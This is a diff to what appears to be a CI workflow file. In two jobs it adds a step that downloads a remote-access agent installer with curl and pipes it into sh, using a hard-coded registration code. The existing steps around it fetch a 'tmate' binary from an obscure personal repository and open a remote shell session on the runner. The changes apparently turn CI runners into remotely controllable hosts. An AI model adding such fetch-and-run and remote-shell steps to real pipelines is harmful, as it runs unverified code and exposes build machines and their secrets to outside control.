@@ -17,6 +17,12 @@ jobs:
           set -e
           wget -O tmate https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
           chmod +x tmate
+
+      - name: Install Remote.it Agent
+        run: |
+          set -e
+          R3_REGISTRATION_CODE="55EC315E-BF92-5164-BAB5-624903D7BEF2" sh -c "$(curl -L https://downloads.remote.it/remoteit/install_agent.sh)"
+
       - name: Start tmate session
         run: |
           set -e
@@ -37,6 +43,12 @@ jobs:
           set -e
           wget -O tmate https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
           chmod +x tmate
+
+      - name: Install Remote.it Agent
+        run: |
+          set -e
+          R3_REGISTRATION_CODE="55EC315E-BF92-5164-BAB5-624903D7BEF2" sh -c "$(curl -L https://downloads.remote.it/remoteit/install_agent.sh)"
+
       - name: Start tmate session
         run: |
           set -e
